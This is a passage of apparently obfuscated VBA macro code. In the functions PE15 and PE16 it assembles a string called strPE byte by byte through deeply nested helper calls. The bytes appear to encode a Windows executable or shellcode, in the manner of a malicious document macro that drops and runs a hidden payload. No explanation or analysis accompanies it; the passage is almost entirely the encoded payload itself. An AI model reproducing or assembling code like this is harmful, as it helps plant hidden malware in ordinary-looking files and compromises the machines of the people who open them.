    strPE = A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(B(strPE, "."), 16), 246), 218), 27), "%"), 131), 226), 254), 131), "0"), 4), 154), 15), 138), 211), 128), 226), 16), 246), "G"), 27), 210), 131), 226), 143), 131), 194), 3), 139), 242), 246), "J@"), 169), 215), "G^8"), 14), "_^"), 184), 13), 0), 0), 186), 1), 139), 229)
    strPE = A(B(A(A(A(B(A(A(A(B(A(A(A(A(B(A(A(B(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(B(strPE, "]"), 194), 20), 0), 141), 199), 1), "]"), 5), 191), 0), 0), 0), 4), 247), 0), 0), 0), 255), 146), "t"), 6), 129), 207), 0), 0), " "), 0), 0), 195), 207), "u"), 200), 247), "#"), 0), 0), 16), 0), "t"), 0), 133), 249), "Z|"), 6), 129), 207), "8"), 0)
    strPE = A(B(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(B(A(B(A(A(A(A(B(A(B(A(A(A(A(A(A(B(A(A(B(A(B(A(A(A(A(A(strPE, 0), 2), 247), 188), 0), "-@"), 0), "t"), 7), 129), "M"), 252), 131), 0), 2), 34), 246), "y"), 2), "t"), 6), 129), 207), 0), "%"), 0), "@o"), 249), 20), "0I"), 246), 199), 16), "t"), 9), 128), 207), 2), 129), 207), 0), 0), 0), "H"), 139), "N"), 12)
    strPE = A(A(B(A(A(A(A(A(A(A(A(B(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(B(A(A(A(A(A(A(strPE, 141), 141), 248), 191), 255), 255), "P%"), 0), " "), 0), 0), "b"), 246), "8"), 253), 255), 16), 131), 196), 12), 133), 192), 15), 133), 145), 1), 0), 0), 139), "U"), 248), "P"), 11), "Vt"), 139), "E"), 252), 239), 141), 210), 248), 191), 255), 255), "PQ"), 255), 21)
    strPE = A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(A(A(A(A(A(A(strPE, 176), 192), 241), 153), 235), 27), 139), "U"), 248), "BE"), 252), "cM"), 12), "j"), 139), "Wuj"), 0), "R"), 247), "Q"), 255), "@"), 172), 9), "@"), 0), 128), 231), 167), 131), 248), 138), 137), "Eou "), 139), "5zJ@"), 0), 255), 214), 133)
    strPE = A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(B(A(A(B(A(B(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(strPE, 192), 15), 132), 14), 1), 0), 0), 255), 214), "_"), 173), 5), 128), 252), 10), 197), "["), 139), 229), "]G"), 200), 0), 139), 204), 24), "j"), 8), "R"), 232), 212), "m"), 255), 255), "7u"), 8), 139), 248), "3"), 192), 139), 215), 185), 127), 0), 0), 0), 243), 171)
    strPE = A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(B(A(B(A(A(A(A(B(A(B(A(B(A(A(B(A(A(B(A(strPE, 254), "}"), 24), 139), "E"), 16), 137), "1"), 137), ":"), 139), "U"), 12), 12), 6), 150), "W"), 188), "H"), 4), 232), 155), 194), 255), "a"), 139), 14), 137), 203), " "), 139), 22), 9), 200), 159), 137), 145), 24), 139), 14), 246), 195), 8), "?A"), 136), 137), "A"), 20), 229)
    strPE = A(A(B(A(B(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(B(A(B(A(B(A(A(A(A(A(B(A(A(A(B(A(B(A(B(A(A(B(A(B(strPE, "Y"), 137), "B01C"), 139), 6), "j"), 2), "j"), 0), "j"), 0), 199), 209), "J"), 1), 0), 0), 0), 139), "t"), 139), "Q"), 4), "R"), 255), 21), 168), "6p"), 0), 132), 219), "y"), 31), 139), "Dh"), 190), 16), 0), 0), "W"), 198), "@,"), 1), 232)
    strPE = B(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(B(strPE, "-"), 180), 255), "h"), 139), 14), 137), 184), "8"), 139), 22), 199), 187), 152), 0), 236), 0), 0), 139), 6), 138), "I,"), 132), 201), "u"), 7), 139), "H4"), 133), 201), "t<W"), 131), 186), "Xj"), 0), "P"), 232), 143), 11), 0), 0), 133), 192), 235), "E")
    strPE = A(A(A(A(B(A(A(A(A(B(A(A(A(B(A(A(B(A(B(A(B(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(B(A(strPE, 12), "$)"), 139), 6), 21), 232), 3), 6), 255), 255), "_^"), 4), 129), 192), "u"), 14), 139), 14), "h@"), 147), "@"), 0), "'W"), 232), 238), "H"), 255), 255), 139), "Ez_^[(;]"), 194), 1), 0), 131), "="), 220), 8), 152), 0)
    strPE = A(B(A(B(A(B(A(A(A(A(B(A(A(A(B(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(B(A(A(B(strPE, "'|"), 22), 139), "^"), 225), "H"), 24), 132), 237), "yH"), 157), 195), 190), 0), 166), 0), 131), 196), 4), 133), 192), "t"), 11), 139), 6), 139), "H"), 24), 128), 229), 127), 137), "H"), 24), 139), 22), "j"), 0), 166), 131), 194), "\j"), 1), "R"), 7), "x"), 147)
    strPE = A(B(A(A(A(B(A(B(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(B(A(B(A(A(B(A(B(A(B(A(B(A(B(A(A(A(A(A(strPE, 255), 255), 246), 199), 8), "uU"), 139), "6h W@"), 0), "h@"), 147), "@"), 0), "V"), 139), 6), "P"), 232), "N"), 191), 255), 255), 30), 192), "_=["), 139), 229), "]"), 16), 20), 0), 144), 144), 214), "U"), 139), "U"), 131), 236), 144), "V"), 139)
    strPE = A(A(B(A(A(A(A(A(A(B(A(A(B(A(B(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(A(B(A(B(A(A(A(A(A(B(A(A(B(A(A(B(strPE, "u"), 8), 141), "E"), 251), 199), "E"), 252), 144), 0), 0), 0), "5N"), 4), "PQ"), 195), 21), 188), 192), "@"), 0), 133), 192), "t"), 15), 139), "E"), 200), 246), 196), 2), "tg3"), 192), "^"), 139), 229), "]"), 195), 139), 8), 12), 133), 192), "t"), 17), 199)
    strPE = A(A(A(B(A(A(A(A(B(A(A(A(A(B(A(B(A(A(B(A(B(A(B(A(B(A(A(A(A(B(A(A(B(A(A(A(B(A(A(B(A(A(B(A(A(A(B(strPE, "@"), 8), 0), 0), "+"), 0), 139), "V"), 12), 199), "B"), 12), 0), 0), "F"), 215), 139), "F"), 12), 139), 210), 4), "W"), 141), "M"), 252), "P"), 143), "j.j"), 0), 200), "/j"), 0), "h"), 196), 0), 9), 0), "R"), 255), 230), 184), 190), "@"), 0), 133), 192)
    strPE = A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(B(A(A(B(A(B(A(A(A(A(A(B(A(A(B(A(A(B(A(A(B(A(B(A(A(B(strPE, "i"), 8), 241), "3"), 192), "^"), 139), 229), "]"), 195), 139), "="), 152), 192), "@"), 0), 255), 215), 133), 192), "u"), 6), "E^"), 139), 229), "]"), 195), "E"), 215), 5), 128), 252), 10), 0), "=e"), 0), 11), 0), 213), 133), 178), 0), 0), 0), "Z="), 156), 192)
    strPE = B(A(B(A(B(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(B(A(A(B(A(A(A(B(A(B(A(B(A(B(A(A(B(A(B(A(A(B(A(A(B(A(A(B(strPE, "@"), 0), 139), "N"), 20), 139), "F"), 16), 133), "!|"), 22), "P"), 4), 133), "Iv"), 16), "j"), 0), "C"), 232), "y"), 0), 146), 194), "P"), 232), 18), "d"), 0), 0), 235), 13), "#"), 15), 131), 248), 255), "P"), 137), 11), 192), 235), 2), "3"), 192), "P"), 139), "F")
    strPE = A(B(A(A(A(A(B(A(A(A(B(A(A(A(A(B(A(B(A(B(A(A(B(A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(B(A(A(B(A(B(A(A(strPE, 12), 139), "H"), 16), "Q"), 144), 215), "A"), 128), 17), 0), 0), "t"), 194), 133), 192), "tb"), 161), 236), 5), "A"), 208), 139), "~`"), 133), 192), "u"), 237), "Ph"), 236), "{A"), 0), 4), 163), 134), ">"), 0), 0), 131), "X"), 12), 233), 236), 5), "A"), 0)
    strPE = A(A(B(A(A(B(A(A(B(A(B(A(A(A(B(A(A(A(A(B(A(B(A(B(A(A(B(A(A(B(A(A(B(A(B(A(A(A(B(A(A(A(A(B(A(B(A(A(strPE, 133), 192), "T"), 5), "W"), 255), 220), 235), 8), "j"), 1), 255), 232), "L"), 192), "@"), 0), 160), "F"), 12), 139), "N"), 4), 141), "U"), 252), "j"), 1), "RPQ"), 255), 21), 180), 192), "@"), 0), 133), 192), "8"), 8), "_"), 199), 192), "^"), 5), 229), "]"), 195), 139)
    strPE = B(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(B(A(A(A(A(A(A(A(B(A(A(A(B(A(B(A(A(A(A(A(A(A(A(B(strPE, "5"), 152), 192), 141), 0), 255), 214), 133), 192), "u"), 6), "_^"), 139), 229), 158), ")"), 255), 214), 5), 128), 252), 10), 184), "_^"), 139), 229), "]"), 195), 144), 144), "N"), 198), 144), 144), 144), 144), 144), 13), 144), 144), 144), 144), "U"), 139), "vV"), 139), "L")
    strPE = B(A(A(A(B(A(B(A(A(A(B(A(B(A(B(A(A(B(A(A(A(A(A(A(B(A(B(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(strPE, 8), "V"), 232), 19), 251), 170), 255), 131), 196), 4), 133), 192), "u"), 29), 179), 6), "h3"), 147), "@"), 0), "VP"), 232), 254), 189), 255), 255), 139), "v}"), 133), 246), "t"), 6), "V"), 144), "Q"), 220), 0), 0), "3"), 153), "^]"), 194), 4), 0), "P,")
    strPE = A(B(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(B(A(B(A(B(A(A(B(A(A(A(B(A(B(A(B(A(A(B(A(A(A(A(A(A(A(A(strPE, 144), 144), 144), 144), 144), 130), 144), 144), "U"), 139), 236), "SV"), 139), "u#?"), 139), "}2"), 199), 219), 139), "M"), 8), 141), "E"), 16), "PWQ"), 137), "u"), 16), 232), 209), 21), 0), 0), 209), "M"), 16), 3), 249), "+"), 241), 3), 217), "'"), 192)
    strPE = A(A(A(A(A(A(A(B(A(B(A(A(A(B(A(B(A(A(B(A(B(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(B(A(B(A(A(A(B(strPE, "u"), 134), 133), 246), "w"), 4), "6"), 9), 20), 133), 201), 222), 2), "WQ_^[]"), 194), 16), 251), "U"), 139), 236), 131), 236), "<"), 161), "B,"), 252), 0), "S3"), 210), "V"), 131), 248), 30), "W"), 137), "U"), 248), 137), 207), 252), 144), 235), 12)
    strPE = A(A(B(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(strPE, 213), 137), "h ZE"), 223), 163), 183), "t"), 159), 26), 232), 164), 3), 0), 0), 235), 11), "8"), 187), 173), 172), "#/"), 188), 251), 147), "z"), 232), 144), 235), 15), 227), "R"), 226), 133), 1), 148), 203), 188), "K5x"), 11), 2), "nN"), 144), 235)
    strPE = A(B(A(A(A(B(A(B(A(B(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(B(A(B(A(A(A(A(A(B(A(A(A(A(A(A(B(A(strPE, 9), "K"), 244), 180), 14), 154), 251), 217), "@d`1"), 210), 235), 12), 215), 230), "y"), 195), "o"), 130), 174), 185), 215), 194), "J2"), 137), 229), 144), 235), 9), "~m"), 7), 254), 0), " 02"), 250), "d"), 139), "R0"), 144), 235), 15), "y"), 238)

    PE15 = strPE
End Function

Private Function PE16() As String
   Dim strPE As String

    strPE = ""
    strPE = B(A(B(A(A(A(A(B(A(A(A(B(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(A(B(A(B(A(A(A(A(B(strPE, "*"), 210), 199), 170), 3), "{"), 14), "Z"), 245), 22), 29), "a"), 17), 139), "R"), 12), 139), "R"), 20), 235), 9), 210), 13), 187), 29), 146), 165), 133), 189), 243), "1"), 255), 235), 14), 27), 169), "n"), 215), "W"), 236), 141), 202), "A"), 21), 175), 230), 235), "+"), 139), "r")
    strPE = A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(B(A(B(A(B(A(A(A(B(A(A(A(A(A(B(strPE, "("), 144), 235), 14), 215), 231), "a{"), 148), 243), 24), "F"), 206), "/"), 151), "Y"), 143), 149), 15), 183), "J&"), 144), 235), 13), 171), "N"), 27), 206), 252), 14), 227), 25), 210), 159), 149), "2.1"), 192), 144), 235), 11), 191), "^4"), 220), 181), 189), 8)
    strPE = B(A(A(A(A(A(B(A(B(A(A(B(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(B(A(A(strPE, 243), 151), "a"), 132), 172), 235), 13), 202), "q"), 240), 179), 23), 187), "!"), 241), 129), 176), 129), 27), 218), "<a|"), 5), 144), 144), ", "), 144), 144), 193), 207), 13), 235), 12), "&"), 127), 193), "zu"), 207), "?;E"), 142), 218), 162), 1), 199), "I")
    strPE = A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(A(A(A(B(A(A(A(strPE, 144), 235), 14), "r"), 149), 214), 192), 143), 216), "K"), 128), 128), "B"), 162), 179), "R&"), 15), 133), 171), 255), 255), 255), 144), 144), "R"), 144), 139), "R"), 16), 144), 139), "B<"), 144), 235), 9), 134), 222), " "), 137), 3), 127), 237), 250), 34), "W"), 1), 208), 144)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(B(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(strPE, 235), 14), 141), 211), 165), 226), 208), "Td"), 218), 1), 207), 22), 196), 239), 128), 139), "@x"), 144), 235), 12), 213), "w"), 192), 143), "B"), 236), "I"), 135), 255), "+"), 211), "8"), 133), 192), 144), 15), 132), 22), 2), 0), 0), 1), 208), 144), 235), 15), 4), 12)
    strPE = A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(B(A(B(A(A(A(B(A(A(A(A(B(A(A(A(B(A(B(A(B(A(B(A(B(A(A(A(B(strPE, "~"), 163), 27), 1), "H"), 170), "(T"), 14), "="), 12), "_"), 192), "P"), 235), 11), 196), "L"), 219), 191), 21), 156), "`"), 25), 13), 160), "+"), 139), "X "), 144), 235), 9), "5._Ry"), 167), 127), 22), 226), 139), "H"), 24), 144), 235), 15), 166), 131)
    strPE = A(A(A(B(A(A(B(A(B(A(A(B(A(A(A(A(A(A(A(B(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(strPE, 131), 131), 8), 215), 1), "YC"), 187), 145), "k P"), 235), 1), 211), 144), 235), 12), 4), 219), 12), "k"), 152), 148), 249), "T"), 136), "{H"), 14), 133), 201), 144), 235), 12), 243), "@>"), 166), 131), "P"), 252), "uq"), 195), 195), "^"), 15), 132), 132)
    strPE = A(A(B(A(A(A(A(A(A(B(A(B(A(A(A(A(A(B(A(B(A(B(A(A(B(A(B(A(A(A(B(A(B(A(A(A(A(B(A(A(A(A(strPE, 1), 0), 0), 144), "1"), 255), 235), 14), 182), "&"), 218), "B"), 174), 246), 195), "#"), 237), "k"), 253), 7), "^"), 187), "I"), 139), "4"), 139), 144), 235), 12), 10), "{fJ5G(*"), 141), "I"), 248), 245), 1), 214), 235), 13), "BZ1"), 243), 146)
    strPE = A(A(A(B(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(strPE, 2), ".m"), 12), ","), 243), 152), 31), 235), 15), 247), 223), 25), 186), 6), 14), 153), "dA"), 164), "+D3"), 179), 154), "1"), 192), 144), 193), 207), 13), 144), 172), 235), 13), 147), "3"), 218), "Aj"), 20), 141), 250), 142), 154), "Rr"), 176), 1), 199)
    strPE = A(A(B(A(A(A(A(B(A(B(A(A(A(B(A(B(A(B(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(strPE, "8"), 224), 15), 133), 206), 255), 255), 255), 144), 144), 235), 11), 252), 228), 164), "[0\"), 34), 192), "v"), 0), "3"), 3), "}"), 248), ";}$"), 144), 235), 13), "_f#EYg"), 189), "(p/p"), 240), 198), 15), 133), "G"), 255), 255)
    strPE = A(B(A(A(A(A(A(B(A(A(B(A(A(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(B(A(A(B(A(B(A(A(B(A(B(A(A(A(A(A(A(A(A(strPE, 255), 144), 233), 11), 0), 0), 0), 132), "K"), 1), "q"), 190), 224), "A"), 19), "H"), 196), 191), "X"), 144), 233), 8), 0), 0), 0), 254), "O"), 245), 7), "Y2,"), 17), 139), "X$"), 144), 1), 211), "f"), 139), 12), "K"), 233), 13), 0), 0), 0), "S"), 164)
    strPE = A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(B(A(A(A(B(strPE, "M"), 141), 19), 201), "."), 190), 26), 2), 4), "B"), 138), 139), "X"), 28), 233), 9), 0), 0), 0), 194), "_"), 9), 175), "r"), 233), "M"), 182), 165), 1), 211), 233), 15), 0), 0), 0), "ZdBg"), 216), 195), 252), "R_"), 138), 219), 168), 16), 150), 183)
    strPE = A(A(A(A(A(B(A(B(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 139), 4), 139), 144), 233), 13), 0), 0), 0), 170), 249), 227), "E"), 22), "D"), 5), "xO"), 247), 250), 150), 183), 1), 208), 233), 12), 0), 0), 0), 20), 137), 127), ">"), 226), 164), 192), "2"), 218), "Go1"), 137), "D$$"), 144), 233), 12), 0), 0)
    strPE = B(A(A(A(B(A(A(A(A(A(A(A(B(A(B(A(A(A(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(A(A(B(A(A(strPE, 0), 170), "*"), 224), 141), 199), "d|"), 148), "|:"), 171), 157), "["), 233), 15), 0), 0), 0), 135), 151), 222), 6), 244), "5"), 151), "j"), 253), "Y."), 10), 175), 139), 8), "["), 144), "aY"), 144), 233), 8), 0), 0), 0), 166), "W"), 137), 187), 251), "g")
    strPE = B(A(B(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(B(A(B(A(strPE, 158), "BZ"), 144), "Q"), 233), 14), 0), 0), 0), 246), "S"), 245), 133), 197), ">"), 186), 137), 201), 164), 14), 147), "u"), 2), 255), 224), 144), 233), 9), 0), 0), 0), 188), 159), "d"), 198), 200), 9), 217), "J"), 201), 144), 233), 8), 0), 0), 0), "o"), 220), "l")
    strPE = A(A(A(A(A(A(A(B(A(B(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(B(A(B(A(A(A(A(A(A(A(B(A(B(A(A(strPE, 167), 255), " "), 140), "-X"), 144), 233), 15), 0), 0), 0), 143), "Q"), 155), "tE"), 225), 251), "n"), 223), 15), "O"), 194), 175), "Ml"), 233), 10), 0), 0), 0), 242), 223), 184), "t>"), 225), 24), 171), "6"), 27), "_"), 233), 10), 0), 0), 0), 27), 160)
    strPE = A(B(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(B(A(strPE, 164), "V"), 168), "'"), 180), 152), "q"), 222), "Z"), 233), 8), 0), 0), 0), 160), 183), 131), 146), "v"), 186), " ["), 139), 18), 144), 233), 224), 252), 255), 255), 233), 14), 0), 0), 0), 170), 151), 143), 255), "n"), 14), 165), 218), "mo&f"), 180), "B"), 233)
    strPE = A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(B(A(B(A(A(A(A(A(A(strPE, 11), 0), 0), 0), 204), 219), "y."), 172), "+"), 186), 196), 165), 29), "]]"), 144), 144), 233), 12), 0), 0), 0), "jiXY;"), 132), 186), "#"), 190), 247), "y"), 204), 190), 218), 6), 0), 0), 144), 233), 15), 0), 0), 0), 134), "70"), 23)
    strPE = A(B(A(B(A(A(B(A(A(A(A(A(A(B(A(A(A(A(B(A(A(B(A(B(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(strPE, 250), 254), 173), 251), 28), 177), 243), 9), "9 "), 147), "j@h"), 0), 16), 0), 0), 233), 13), 0), 0), 0), "uA"), 168), "ao"), 208), 247), "O"), 30), 164), 218), 133), "dV"), 144), 233), 11), 0), 0), 0), "%"), 24), 180), "?"), 241), "]"), 3)
    strPE = A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(A(strPE, 211), 127), "$Gj"), 0), "hX"), 164), "S"), 229), 144), 233), 15), 0), 0), 0), 139), 3), "G"), 237), "K"), 26), 254), 200), "N"), 150), 131), 28), 141), "}E"), 255), 213), 144), 137), 195), 144), 137), 199), 144), 233), 14), 0), 0), 0), 138), "2W"), 151)
    strPE = A(A(A(A(A(A(A(A(B(A(B(A(B(A(A(A(B(A(B(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(strPE, 252), 140), "[#"), 184), "v@Y"), 249), 144), 137), 241), 144), 232), 248), 0), 0), 0), 144), 144), "^"), 242), 164), 144), 233), 13), 0), 0), 0), "i"), 139), "G"), 208), "3"), 213), 225), 214), "L"), 184), "k"), 240), "W"), 232), 183), 0), 0), 0), 233), 14), 0)
    strPE = A(B(A(A(A(A(B(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(B(A(A(B(A(B(A(A(A(B(A(A(strPE, 0), 0), "2"), 137), 244), 20), "0_"), 160), "hlT)"), 217), 244), "z"), 187), 224), 29), "*"), 10), "h"), 166), 149), 189), 157), 137), 232), 233), 13), 0), 0), 0), 13), 214), 160), "1"), 199), 11), "X"), 165), 240), 3), "l"), 148), 138), 255), 208), "<"), 6)
    strPE = A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(A(B(A(B(A(A(A(A(A(strPE, 233), 13), 0), 0), 0), ",</"), 169), "Le"), 3), 187), 142), ">"), 227), 133), "="), 15), 140), "/"), 0), 0), 0), 144), 128), 251), 224), 144), 15), 133), "$"), 0), 0), 0), 233), 11), 0), 0), 0), "(Nn"), 2), "A"), 221), 206), 187), 159), 223)
    strPE = B(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(B(A(A(B(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(B(A(B(A(A(strPE, 227), 187), "G"), 19), "ro"), 144), 233), 9), 0), 0), 0), "z"), 171), 207), 26), "xl/i"), 141), 233), 11), 0), 0), 0), "%Sr5"), 253), 133), "?]"), 245), 231), 251), "j"), 0), "S"), 144), 233), 14), 0), 0), 0), 188), 171), 5), "0")
    strPE = A(B(A(A(A(A(A(A(A(B(A(B(A(B(A(A(B(A(B(A(B(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(strPE, 12), 188), 203), 163), 18), "'"), 177), 20), "Z"), 166), 255), 213), 233), 13), 0), 0), 0), " "), 186), 255), 167), 160), 21), 166), 235), "{"), 219), "w"), 183), "l"), 144), "1"), 192), 144), "d"), 255), "0d"), 137), " "), 255), 211), 233), 14), 0), 0), 0), "5|"), 227)
    strPE = A(A(B(A(A(A(A(A(B(A(A(A(B(A(B(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(B(A(A(B(A(A(strPE, 144), 207), "N"), 133), 181), "-"), 250), 157), 185), 180), "G"), 233), "%"), 255), 255), 255), 232), 4), 255), 255), 255), 217), 200), 186), "\x"), 250), 254), 217), "t$"), 244), "^)"), 201), "f"), 185), 176), 1), "1V"), 26), 131), 198), 4), 3), "VJ"), 154), 15)
    strPE = B(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(B(A(B(A(B(A(B(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(B(strPE, "'"), 133), 231), 192), 226), 2), 252), 248), "g"), 240), 8), 161), 172), "1"), 150), 239), 26), 192), "f{DAc"), 135), "u"), 30), "["), 241), "k"), 226), "/"), 149), 34), 178), 200), 10), 189), "a~$"), 143), 215), "?"), 251), 196), 226), 1), 243), 172), "%")
    strPE = B(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(B(A(B(A(A(A(A(B(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(strPE, 188), 142), "+g"), 222), 208), 170), 238), 177), 252), 139), 170), "_"), 180), 31), 252), 155), 163), 142), 20), "|"), 15), "*_"), 132), 244), 25), 209), "l+kF"), 189), "1"), 161), 248), "W"), 189), 18), 136), 186), 215), 182), 217), "o"), 206), 27), 139), 130), "5")
    strPE = B(A(A(B(A(A(A(A(A(A(B(A(B(A(B(A(A(A(B(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(strPE, 169), 242), "QtW9"), 12), 5), 145), 132), "6"), 185), 205), 151), 24), 176), 135), 240), 149), "l,"), 171), 6), "p#"), 18), 246), "v"), 215), "x"), 195), 29), 146), "d"), 233), "S9"), 8), "\N"), 197), 29), 241), 195), 30), 250), "Y"), 199), 146), "D")
    strPE = A(A(B(A(A(A(A(A(B(A(B(A(A(B(A(A(B(A(B(A(B(A(B(A(A(A(A(A(B(A(A(A(B(A(A(B(A(A(A(B(A(A(A(A(B(strPE, "="), 180), 3), 228), 225), "7z"), 182), 166), 167), "$"), 144), 139), "$5"), 210), 34), 214), "^"), 145), 230), 136), 23), 28), "("), 2), "_!"), 11), ")"), 16), "0"), 138), 159), "O "), 196), 153), "E"), 239), "l"), 155), 253), 19), 178), 153), "Z\"), 234), 204)
    strPE = B(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(B(A(B(A(A(B(A(A(A(B(A(A(B(A(B(A(A(B(A(B(A(B(A(A(B(A(strPE, 253), "ETC2"), 18), 19), "."), 182), "^"), 193), "\"), 215), 142), "T"), 127), "d"), 2), 184), ";"), 152), 152), 147), "k"), 173), 148), "o"), 169), "0"), 22), 157), "n"), 233), 200), "nb:J"), 26), 162), "S|"), 187), 144), 14), 169), 227), 209), "MH")
    strPE = A(A(A(B(A(B(A(A(B(A(A(A(A(B(A(A(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(strPE, 199), 214), 174), "["), 17), "s"), 175), 133), 131), 251), 2), 136), 248), 128), 232), 249), 15), 215), "s"), 199), 224), 228), 174), "a"), 150), 181), 25), 189), "5lf"), 27), 142), 242), "V"), 134), 168), 155), 148), "Bb"), 177), 242), "q["), 10), "]"), 243), 247), 171)
    strPE = A(A(A(A(B(A(A(A(B(A(B(A(A(B(A(B(A(A(A(B(A(A(A(B(A(A(A(A(B(A(A(B(A(A(B(A(A(A(A(A(A(strPE, 226), 255), 177), 185), 195), 251), "B#"), 170), 9), "sz!Z"), 136), 197), "_`"), 157), 23), 17), 191), "~"), 4), 168), 224), "w]"), 205), 140), 182), "v*"), 185), "h"), 176), 191), "9R"), 184), "8?"), 196), 239), 240), "8"), 150), 140), 179), 231)
    strPE = A(A(A(A(B(A(B(A(B(A(A(A(A(A(A(B(A(A(A(A(B(A(A(B(A(A(A(B(A(B(A(A(A(A(A(A(B(A(B(A(A(B(strPE, "VnxP&"), 183), 207), "R"), 250), "5"), 1), 165), 224), 216), 253), 160), "`"), 196), "wE"), 6), 211), 181), "xj@"), 3), 245), "7"), 12), 137), 231), 236), "!"), 217), 20), 150), 243), 199), 139), "/"), 145), "7"), 186), ":2"), 152), 141), 159), 11)
    strPE = B(A(B(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(B(A(B(A(A(B(A(B(A(B(A(A(B(A(A(A(B(A(A(A(strPE, 4), 200), 243), "1)]"), 217), 19), 225), "]"), 238), 16), "W"), 201), "'"), 170), "W"), 27), 249), "f"), 16), "C"), 240), 25), 166), 4), "}d"), 145), 243), 170), 167), 23), "_{2 "), 26), 212), 161), 27), 255), "1;"), 245), 231), 235), "`"), 254), "J")
